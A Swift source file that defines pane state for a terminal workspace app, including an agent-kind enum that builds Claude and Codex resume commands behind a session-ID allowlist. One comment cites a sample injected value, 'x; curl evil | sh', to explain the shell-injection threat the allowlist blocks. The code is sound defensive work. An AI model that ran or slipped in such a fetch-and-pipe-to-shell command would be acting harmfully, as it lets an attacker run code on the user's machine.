import Foundation

enum PaneStatus: String, Codable, Equatable {
    case idle
    case running
    case waitingForInput
}

/// Which agent CLI a pane's lifecycle events came from. Carried on the
/// `nex event --agent <name>` wire field (absent = `.claude`, the
/// pre-#101 behaviour) and persisted on the pane so a restart can
/// compose the right resume command. Strict enum — never interpolate a
/// raw wire string into a shell command.
enum AgentKind: String, Codable, Equatable {
    case claude
    case codex

    /// Shell command that resumes session `sessionID` for this agent,
    /// typed into a freshly spawned PTY on restart / reopen-closed-pane.
    /// Returns nil — resume is skipped — when the session id fails the
    /// allowlist: the id arrives on the wire (hook stdin → socket JSON)
    /// and is later *typed into a shell*, so a hostile local sender
    /// could otherwise persist `x; curl evil | sh` for execution on the
    /// next restart. Known Claude/Codex ids are UUID-shaped; the
    /// allowlist is a conservative superset (review of #101).
    func resumeCommand(sessionID: String) -> String? {
        guard Self.isSafeSessionID(sessionID) else { return nil }
        return switch self {
        case .claude: "claude --resume \(sessionID)"
        case .codex: "codex resume \(sessionID)"
        }
    }

    /// Shell-inert session-id shape: alphanumerics plus `.`/`_`/`-`,
    /// non-empty, bounded length. Anything else never reaches a PTY.
    static func isSafeSessionID(_ id: String) -> Bool {
        guard !id.isEmpty, id.count <= 128 else { return false }
        return id.allSatisfy { ch in
            ch.isASCII && (ch.isLetter || ch.isNumber || ch == "." || ch == "_" || ch == "-")
        }
    }

    /// Wire-string mapping: absent or unrecognized values fall back to
    /// `.claude` so an old CLI (no `agent` field) keeps today's
    /// behaviour. Case-insensitive — a hand-wired `--agent Codex`
    /// should not silently mislabel the pane.
    static func fromWire(_ raw: String?) -> AgentKind {
        raw.flatMap { AgentKind(rawValue: $0.lowercased()) } ?? .claude
    }
}

struct Pane: Identifiable, Equatable {
    /// Default body font size (px) for markdown preview panes. The reset
    /// keybinding (⌘0) snaps `markdownFontSize` back to this value.
    static let defaultMarkdownFontSize: Double = 14

    let id: UUID
    var label: String?
    var type: PaneType
    var title: String?
    var workingDirectory: String
    var gitBranch: String?
    var status: PaneStatus
    var filePath: String?
    var isEditing: Bool
    /// When non-nil on a markdown pane in edit mode, the shell command used
    /// to launch the user's `$EDITOR` inside a ghostty surface bound to this
    /// pane. Nil means use the built-in `MarkdownEditorView`. Transient — not
    /// persisted.
    var externalEditorCommand: String?
    /// In-memory text content for scratchpad panes. Persisted to the database
    /// but never written to a file on disk.
    var scratchpadContent: String?
    var agentSessionID: String?
    /// Last known agent CLI seen in this pane (set by `start` /
    /// `session-start` lifecycle events, dual-fires included). Drives the
    /// running-badge label and the restart resume command. Persisted;
    /// deliberately NOT cleared alongside `agentSessionID` on state load —
    /// it is a display/last-known value, and clearing it before the
    /// resumable panes are captured would break codex resume. Nil = no
    /// agent event ever seen (badge falls back to "claude").
    var agentKind: AgentKind?
    /// Rendered body font size (px) for markdown preview panes. Per-pane,
    /// in-memory only; adjusted via Cmd+= / Cmd+-.
    var markdownFontSize: Double
    /// When set on a markdown pane created via `nex open --here`, points
    /// at the parked source pane in the workspace's `parkedPanes` lane.
    /// Closing this pane restores the source instead of taking the
    /// normal close path. In-memory only; not persisted.
    var parkedSourcePaneID: UUID?
    /// Wall-clock time the current agent run started, used by the chrome
    /// to show "claude · mm:ss" elapsed. Set when status transitions into
    /// `.running` (guarded so repeated start pings within a run don't reset
    /// it). Transient — not persisted, so a pane restored as `.running`
    /// has this nil until the resumed agent re-emits a start.
    var agentStartedAt: Date?

    /// Number of Claude Code background units still in flight for this
    /// pane's agent (`run_in_background` shells + background subagents),
    /// as reported by the `background_tasks` array on the most recent
    /// `Stop` / `Notification` hook (issues #215, #220). Non-zero means
    /// the turn ended but work continues, so the pane stays `.running`
    /// instead of falsely reading `.waitingForInput`. Transient — not
    /// persisted; reset to 0 on the next `start` / `error`.
    var backgroundTaskCount: Int

    /// Convenience accessor for rendering logic.
    var isUsingExternalEditor: Bool { externalEditorCommand != nil }
    var createdAt: Date
    var lastActivityAt: Date

    init(
        id: UUID = UUID(),
        label: String? = nil,
        type: PaneType = .shell,
        title: String? = nil,
        workingDirectory: String = NSHomeDirectory(),
        gitBranch: String? = nil,
        filePath: String? = nil,
        isEditing: Bool = false,
        externalEditorCommand: String? = nil,
        scratchpadContent: String? = nil,
        status: PaneStatus = .idle,
        agentSessionID: String? = nil,
        agentKind: AgentKind? = nil,
        markdownFontSize: Double = Pane.defaultMarkdownFontSize,
        parkedSourcePaneID: UUID? = nil,
        agentStartedAt: Date? = nil,
        backgroundTaskCount: Int = 0,
        createdAt: Date = Date(),
        lastActivityAt: Date = Date()
    ) {
        self.id = id
        self.label = label
        self.type = type
        self.title = title
        self.workingDirectory = workingDirectory
        self.gitBranch = gitBranch
        self.filePath = filePath
        self.isEditing = isEditing
        self.externalEditorCommand = externalEditorCommand
        self.scratchpadContent = scratchpadContent
        self.status = status
        self.agentSessionID = agentSessionID
        self.agentKind = agentKind
        self.markdownFontSize = markdownFontSize
        self.parkedSourcePaneID = parkedSourcePaneID
        self.agentStartedAt = agentStartedAt
        self.backgroundTaskCount = backgroundTaskCount
        self.createdAt = createdAt
        self.lastActivityAt = lastActivityAt
    }
}
